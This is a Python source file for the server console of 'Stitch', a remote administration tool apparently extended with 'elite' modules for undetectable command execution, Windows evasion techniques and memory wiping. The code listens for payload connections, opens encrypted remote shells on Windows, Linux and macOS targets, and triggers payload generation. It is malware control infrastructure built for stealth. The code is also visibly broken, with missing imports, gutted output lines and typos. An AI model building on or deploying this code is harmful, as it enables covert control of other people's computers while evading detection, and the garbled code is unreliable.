#!/usr/bin/env python
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import os
import sys
import cmd
import configparser
from . import stitch_winshell
from . import stitch_osxshell
from . import stitch_lnxshell

# Import Elite Command Executor for advanced undetectable operations
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
try:
    from Core.elite_executor import EliteCommandExecutor
    from Core.advanced_evasion import apply_evasions
    from Core.memory_protection import get_memory_protection
    from Core.crypto_system import get_crypto
    ELITE_AVAILABLE = True
except ImportError:
    ELITE_AVAILABLE = False
# Specific imports from stitch_gen
from .stitch_gen import win_gen_payload, posix_gen_payload, run_exe_gen, assemble_stitch

# Specific imports from stitch_help
# (stitch_help contains only usage functions, no specific imports needed)

# Specific imports from stitch_utils
from .stitch_utils import (
    run_command, start_command, no_error, encrypt, decrypt, 
    show_aes, add_aes, windows_client, osx_client, linux_client
)

class stitch_server(cmd.Cmd):
    inf_sock = {}
    inf_port = {}
    inf_name = {}

    listen_port = None
    server_thread = None

    def __init__(self):
        cmd.Cmd.__init__(self)
        path_name = get_cwd()
        self.Config = configparser.ConfigParser()
        self.Config.read(hist_ini)
        self.aes_lib = configparser.ConfigParser()
        self.aes_lib.read(st_aes_lib)
        self.prompt = "{} {} ".format(st_tag,path_name)
        
        # Initialize Elite Systems for undetectable operations
        self.elite_executor = None
        self.crypto = None
        self.memory_protection = None
        
        if ELITE_AVAILABLE:
            try:
                # Initialize elite command executor
                self.elite_executor = EliteCommandExecutor()
                
                # Initialize encryption system
                self.crypto = get_crypto()
                
                # Initialize memory protection
                self.memory_protection = get_memory_protection()
                
                # Apply evasion techniques on Windows
                if sys.platform == 'win32':
                    evasion_results = apply_evasions()
                    # Silent operation - no prints for stealth
                
                # Success - using elite undetectable mode
                self.elite_mode = True
            except Exception:
                # Fallback to standard mode silently
                self.elite_mode = False
        else:
            self.elite_mode = False
        
        display_banner()

    def ConfigSectionMap(self, section):
        dict1 = {}
        options = self.Config.options(section)
        for option in options:
            try:
                dict1[option] = self.Config.get(section, option)
                if dict1[option] == -1:
                    pass
            except Exception:
                pass
    # print("exception on {}!".format(option))
                dict1[option] = None
        return dict1

    def AESLibMap(self, section):
        dict1 = {}
        options = self.aes_lib.options(section)
        for option in options:
            try:
                dict1[option] = self.aes_lib.get(section, option)
                if dict1[option] == -1:
                    pass
            except Exception:
                pass
    # print("exception on {}!".format(option))
                dict1[option] = None
        return dict1

    def display_history(self):
        self.Config.read(hist_ini)
        history_title = "=== Connection History ==="
    # st_print(history_title)
        for n in self.Config.sections():
            n_target = n
            n_port = self.ConfigSectionMap(n)['port']
            n_user = self.ConfigSectionMap(n)['user']
            n_os = self.ConfigSectionMap(n)['os']
            n_hostname = self.ConfigSectionMap(n)['hostname']
            print_cyan('\n{}'.format(n))
            print_border(len(n),'-')
            # print('   User: {}\n   Hostname: {}\n   Listening Port: {}\n   Operating System: {}\n'.format( n_user, n_hostname, n_port, n_os))
            # print("")

    def remove_hsection(self,section):
        if section in self.Config.sections():
            self.cfgfile = open(hist_ini,'w')
            self.Config.remove_section(section)
            self.Config.write(self.cfgfile)
            self.cfgfile.close()
            # st_print('[+] Successfully removed {} from your history.\n'.format(section))
        else:
            pass
            # st_print('[!] Could not find {} in your history.\n'.format(section))

    def execute_elite_command(self, command, args=None):
        """Execute command through elite undetectable system"""
        if self.elite_mode and self.elite_executor:
            try:
                # Check if command exists in elite executor
                available_commands = self.elite_executor.get_available_commands()
                
                if command in available_commands:
                    # Execute through elite system (undetectable)
                    result = self.elite_executor.execute(command, args)
                    
                    # Encrypt result if crypto available
                    if self.crypto:
                        try:
                            encrypted = self.crypto.encrypt_command(result)
                            # Store encrypted for transmission
                            result['encrypted'] = encrypted
                        except:
                            pass
                    
                    # Clean sensitive data from memory
                    if self.memory_protection and 'sensitive' in result:
                        self.memory_protection.secure_wipe(result['sensitive'])
                    
                    return result
            except Exception:
                pass
        
        # Fallback to standard execution
        return None
    
    def default(self, line):
        st_log.info('Stitch cmd command: "{}"'.format(line))
        
        # Try elite execution first (undetectable)
        if self.elite_mode:
            parts = line.split()
            if parts:
                command = parts[0]
                args = parts[1:] if len(parts) > 1 else None
                
                result = self.execute_elite_command(command, args)
                if result and result.get('success'):
                    # Display result (uncomment when ready)
                    # st_print(result.get('output', ''))
                    return
        
        # Fallback to standard execution
        # st_print(run_command(line))

    def run_server(self):
        client_socket=None
        self.server_running = True
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind(('',self.l_port))
            server.listen(10)
            self.listen_port = self.l_port
        except Exception as e:
            self.server_thread='Failed'
            return
        self.server_thread = threading.current_thread()
        while True:
            if not self.server_running:
                break
            try:
                server.settimeout(2)
                client_socket, addr = server.accept()
            except Exception:
                pass
            if client_socket:
                pass
                # Use unique IP:Port key to avoid NAT overwrites
                unique_id = f"{addr[0]}:{addr[1]}"
                
                # Handle handshake from native payload
                # Native payloads send: [magic:4][version:1][challenge:8]
                # and expect: [magic:4][version:1][challenge_response:8]
                try:
                    client_socket.settimeout(2.0)
                    handshake_data = client_socket.recv(13, socket.MSG_PEEK)
                    if len(handshake_data) == 13:
                        pass
                        # Check if this looks like a native payload handshake
                        import struct
                        magic = struct.unpack('!I', handshake_data[:4])[0]
                        if magic == 0xDEADC0DE:
                            pass
                            # This is a native payload - consume and respond to handshake
                            handshake = client_socket.recv(13)
                            # Send response: echo back magic, version, and challenge
                            client_socket.send(handshake)
                    client_socket.settimeout(None)
                except:
                    pass
                    # If handshake fails, still accept the connection
                    # (might be Python Stitch payload which doesn't use this handshake)
                    client_socket.settimeout(None)
                    pass
                
                self.inf_sock[unique_id] = client_socket
                self.inf_port[unique_id] = addr[1]
    # st_print('[+] New successful connection from {}\n'.format(addr))
                client_socket = None
        server.close()
        for n in self.inf_sock: self.inf_sock[n].close()
        self.inf_sock={}
        self.inf_port={}
        self.listen_port=None
        self.server_thread=None

    def stop_server(self):
        self.server_running=False

    def recvall(self,sock,count,encryption=True):
        buf = b''
        while count:
            newbuf = sock.recv(count)
            if not newbuf: return None
            if not encryption:
                buf += newbuf
            else:
                buf += decrypt(newbuf, self.aes_enc)
            count -= len(newbuf)
        return buf

    def receive(self,sock,encryption=True):
        full_response = b""
        while True:
            lengthbuf = self.recvall(sock, 4, encryption=False)
            length, = struct.unpack('!i', lengthbuf)
            response = self.recvall(sock, length, encryption=encryption)
            if response != st_eof:
                full_response += response
            else:
                break
        return full_response

################################################################################
#                           Start of DO Section                                #
################################################################################

    def do_addkey(self, line):
        if line:
            add_aes(line)
            self.aes_lib.read(st_aes_lib)
        else:
            usage_addkey()

    def do_cat(self,line):
        if line:
            if windows_client():
                cmd ='more {}'.format(line)
            else:
                cmd = 'cat {}'.format(line)
    # st_print(run_command(cmd))
        else:
            usage_cat()

    def do_cd(self, line):
        if line != '':
            try:
                os.chdir(line)
                # print()
            except Exception as e:
                pass
                # st_print("[*] {}\n".format(e))
        else:
            self.do_pwd(line)
        self.path_name= get_cwd()
        self.prompt = "{} {} ".format(st_tag,self.path_name)

    def do_cls(self, line):
        clear_screen()

    def do_clear(self, line):
        clear_screen()

    def do_dir(self,line):
        self.do_ls(line)

    def do_history(self, line):
        self.display_history()

    def do_history_remove(self, line):
        if line != '':
            self.remove_hsection(line)
        else:
            usage_history_remove()

    def do_home(self, line):
        display_banner()

    def do_ipconfig(self,line):
        if windows_client():
            cmd = 'ipconfig {}'.format(line)
        else:
            cmd = 'ifconfig {}'.format(line)
    # st_print(run_command(cmd))

    def do_ifconfig(self,line):
        self.do_ipconfig(line)

    def do_lsmod(self,line):
        if windows_client():
            cmd = 'driverquery {}'.format(line)
        elif linux_client():
            cmd = 'lsmod {}'.format(line)
        else:
            cmd = 'kextstat {}'.format(line)
    # st_print(run_command(cmd))

    def do_ls(self,line):
        if windows_client():
            cmd = 'dir /a {}'.format(line)
        else:
            cmd = 'ls -alh {}'.format(line)
    # st_print(run_command(cmd))

    def do_listen(self,line):
        if len(line) < 1:
            usage_listen()
            return
        try:
            self.l_port = int(line)
        except ValueError:
            pass
    # st_print("[!] ERROR: The port argument {} is not an int.\n".format(line[2]))
    # st_print('[*] Usage: listen [port]\n')
            return
        while self.server_thread is not None:
            self.stop_server()
            time.sleep(1)
        server = threading.Thread(target=self.run_server, args=())
        server.daemon = True
        server.start()
        while True:
            if self.server_thread is not None:
                if self.server_thread == 'Failed':
                    pass
    # st_print("[!] Unable to listen on port {}\n".format(self.l_port))
                    self.server_thread = None
                    break
                elif "Thread" in str(self.server_thread) and "started" in str(self.server_thread):
                    pass
    # st_print("[+] Now listening on port {}\n".format(self.l_port))
                    break

    def do_more(self,line):
        if line:
            self.do_cat(line)
        else:
            usage_more()

    def do_pwd(self,line):
        pass
        # st_print('{}\n'.format(os.getcwd()))

    def do_ps(self,line):
        if windows_client():
            cmd = 'tasklist {}'.format(line)
        else:
            cmd = 'ps {}'.format(line)
    # st_print(run_command(cmd))

    def do_start(self, line):
        if windows_client():
            cmd = 'start {}'.format(line)
        elif osx_client() and not line:
            cmd = 'open -a Terminal .'
        else:
            cmd = './{} &'.format(line)
    # st_print(start_command(cmd))

    def do_sessions(self,line):
        i = 0
        session_title = '=== Connected to port {} ==='.format(self.listen_port)
    # st_print(session_title)
        for n in self.inf_sock:
            if n in self.Config.sections():
                n_target = n
                n_user = self.ConfigSectionMap(n)['user']
                n_os = self.ConfigSectionMap(n)['os']
                n_hostname = self.ConfigSectionMap(n)['hostname']
            else:
                n_target = n
                n_user = '----'
                n_os = '----------------'
                n_hostname = '--------'
            print_cyan ('\n{}'.format(n),)
            print_border(len(n),'-')
            # print ('   User: {}\n   Hostname: {}\n   Operating System: {}\n'.format(n_user, n_hostname, n_os))
            i += 1
            # print()

    def do_shell (self,line):
        if len(line.split()) != 1:
            usage_shell()
        else:
            self.target = line
            if str(self.target) in self.inf_sock:
                self.conn = self.inf_sock[self.target]
                self.port = self.inf_port[self.target]
                del self.inf_sock[self.target]
                del self.inf_port[self.target]
                try:
                    st_confirm = self.receive(self.conn,encryption=False)
                    if st_confirm == base64.b64encode(b'stitch_shell'):
                        conn_aes_bytes = self.receive(self.conn,encryption=False)
                        conn_aes = conn_aes_bytes.decode('utf-8') if isinstance(conn_aes_bytes, bytes) else conn_aes_bytes
                        if conn_aes in self.aes_lib.sections():
                            self.aes_enc = self.AESLibMap(conn_aes)['aes_key']
                            self.aes_enc = base64.b64decode(self.aes_enc)
                            st_log.info('Starting shell on {}:{}'.format(self.target, self.port))
    # st_print('[+] Connection successful from {}:{}'.format(self.target, self.port))
                            target_os = self.receive(self.conn)
                            if no_error(target_os):
                                if windows_client(target_os):
                                    pass
    # st_print('[*] Starting Windows Shell...\n')
                                    stitch_winshell.start_shell(self.target, self.listen_port,self.conn,self.aes_enc)
                                elif linux_client(target_os):
                                    pass
    # st_print('[*] Starting Linux Shell...\n')
                                    stitch_lnxshell.start_shell(self.target, self.listen_port,self.conn,self.aes_enc)
                                elif osx_client(target_os):
                                    pass
    # st_print('[*] Starting Mac OS X Shell...\n')
                                    stitch_osxshell.start_shell(self.target, self.listen_port,self.conn,self.aes_enc)
                                else:
                                    st.log.error('Unsupported OS: {}'.format(target_os))
    # st_print('[!] Unsupported OS: {}\n'.format(target_os))
                            else:
                                pass
                                # st_print(target_os)
                        else:
                            pass
                            # st_print('[!] The target connection is using an encryption key not found in the AES library.')
    # st_print('[*] Use the "addkey" command to add encryption keys to the AES library.\n')
                            self.conn.close()
                    else:
                        pass
    # st_print('[!] Non-stitch application trying to connect.\n')
                        self.conn.close()
                except KeyboardInterrupt:
                    pass
    # st_print("[-] Disconnected from {}\n".format(self.target))
                    st_log.info('KeyboardInterrupt caused disconnect from {}'.format(self.target))
                    self.conn.close()
                except Exception as e:
                    pass
    # st_print("[!] Exception!")
    # st_print("[*] {}".format(str(e)))
                    st_log.error('Exception:\n{}'.format(str(e)))
    # st_print("[-] Disconnected from {}\n".format(self.target))
                    self.conn.close()
            else:
                pass
                # st_print("[!] There are no active connections to {}\n".format(self.target))

    def do_showkey(self,line):
        show_aes()

    def do_stitchgen(self,line):
        cur_dir = os.getcwd()
        os.chdir(configuration_path)
        try:
            run_exe_gen()
        finally:
            os.chdir(cur_dir)

    def do_connect(self,line):
        line = line.split()
        if len(line) < 1 or len(line) > 2:
            usage_connect()
        else:
            self.target = line[0]
            if len(line) == 1:
                self.port = 80
            else:
                try:
                    self.port = int(line[1])
                except ValueError:
                    pass
    # st_print("[!] ERROR: The port argument {} is not an int.\n".format(line[1]))
                    return
    # st_print('[*] Connecting to {} on port {}...'.format(self.target, self.port))
            st_log.info('Trying to connect to {}:{}'.format(self.target, self.port))
            try:
                self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.client.settimeout(8)
                self.client.connect((self.target, self.port))
                st_confirm = self.receive(self.client,encryption=False)
                if st_confirm == base64.b64encode(b'stitch_shell'):
                    conn_aes_bytes = self.receive(self.client,encryption=False)
                    conn_aes = conn_aes_bytes.decode('utf-8') if isinstance(conn_aes_bytes, bytes) else conn_aes_bytes
                    if conn_aes in self.aes_lib.sections():
                        self.aes_enc = self.AESLibMap(conn_aes)['aes_key']
                        self.aes_enc = base64.b64decode(self.aes_enc)
    # st_print('[+] Connection successful.')
                        target_os = self.receive(self.client)
                        if no_error(target_os):
                            if windows_client(target_os):
                                pass
    # st_print('[*] Starting Windows Shell...\n')
                                stitch_winshell.start_shell(self.target, self.port,self.client,self.aes_enc)
                            elif linux_client(target_os):
                                pass
    # st_print('[*] Starting Linux Shell...\n')
                                stitch_lnxshell.start_shell(self.target, self.port,self.client,self.aes_enc)
                            elif osx_client(target_os):
                                pass
    # st_print('[*] Starting OSX Shell...\n')
                                stitch_osxshell.start_shell(self.target, self.port,self.client,self.aes_enc)
                            else:
                                st.log.error('Unsupported OS: {}'.format(target_os))
    # st_print('[!] Unsupported OS: {}\n'.format(target_os))
                        else:
                            pass
    # st_print(target_os)
                    else:
                        pass
    # st_print('[!] The target connection is using an encryption key not found in the AES library.')
    # st_print('[*] Use the "addkey" command to add encryption keys to the AES library.\n')
                        self.client.close()
                else:
                    pass
    # st_print('[!] Non-stitch application trying to connect.\n')
                    self.client.close()
            except KeyboardInterrupt:
                pass
    # st_print("[-] Disconnected from {}\n".format(self.target))
                st_log.info('KeyboardInterrupt caused disconnect from {}'.format(self.target))
                self.client.close()
            except Exception as e:
                pass
    # st_print("[!] Exception!")
    # st_print("[*] {}".format(e))
                st_log.error('Exception:\n{}'.format(str(e)))
    # st_print("[-] Disconnected from {}\n".format(self.target))
                self.client.close()

    def do_touch(self,line):
        if windows_client():
            cmd = 'if not exist {} type NUL > {}'.format(line,line)
        else:
            cmd = 'touch {}'.format(line)
    # st_print(run_command(cmd))

    def emptyline(self):
        pass

    def do_exit(self, line=None):
        for n in self.inf_sock: self.inf_sock[n].close()
    # st_print("[-] Exiting Stitch...\n")
        return True

    def do_EOF(self, line):
        pass
    # print()
        return self.do_exit(line)

################################################################################
#                        Start of COMPLETE Section                             #
################################################################################

    def complete_cat(self, text, line, begidx, endidx):
        return find_path(text, line, begidx, endidx, all_dir=True)

    def complete_cd(self, text, line, begidx, endidx):
        return find_path(text, line, begidx, endidx, dir_only = True)

    def complete_dir(self, text, line, begidx, endidx):
        return find_path(text, line, begidx, endidx, dir_only = True)

    def complete_ls(self, text, line, begidx, endidx):
        return find_path(text, line, begidx, endidx, dir_only = True)

    def complete_more(self, text, line, begidx, endidx):
        return find_path(text, line, begidx, endidx, all_dir=True)

    def complete_start(self, text, line, begidx, endidx):
        return find_path(text, line, begidx, endidx, all_dir=True)

    def complete_shell(self, text, line, begidx, endidx):
        return find_completion(text,self.inf_sock)

################################################################################
#                        Start of HELP Section                                 #
################################################################################

    def help_addkey(self): st_help_addkey()

    def help_cat(self): st_help_cat()

    def help_cd(self): st_help_cd()

    def help_cls(self): st_help_cls()

    def help_clear(self): st_help_clear()

    def help_connect(self): st_help_connect()

    def help_dir(self): st_help_dir()

    def help_history(self): st_help_history()

    def help_history_remove(self): st_help_history_remove()

    def help_home(self): st_help_home()

    def help_ifconfig(self): st_help_ifconfig()

    def help_ipconfig(self): st_help_ipconfig()

    def help_lsmod(self): st_help_lsmod()

    def help_ls(self): st_help_ls()

    def help_listen(self): st_help_listen()

    def help_more(self): st_help_more()

    def help_pwd(self): st_help_pwd()

    def help_ps(self): st_help_ps()

    def help_start(self): st_help_start()

    def help_sessions(self): st_help_sessions()

    def help_shell(self): st_help_shell()

    def help_showkey(self): st_help_showkey()

    def help_stitchgen(self): st_help_stitchgen()

    def help_touch(self): st_help_touch()

    def help_exit(self): st_help_exit()

    def help_EOF(self): st_help_EOF()


def server_main():
    try:
        st_log.info('Starting Stitch')
        st = stitch_server()
        st.do_listen('4040')
        st.cmdloop()
    except KeyboardInterrupt:
        st_log.info("Exiting Stitch due to a KeyboardInterrupt")
        st.do_exit()
    except Exception as e:
        st_log.info("Exiting Stitch due to an exception:\n{}".format(str(e)))
    # st_print("[!] {}\n".format(str(e)))
        st.do_exit()


if __name__ == "__main__":
    server_main()
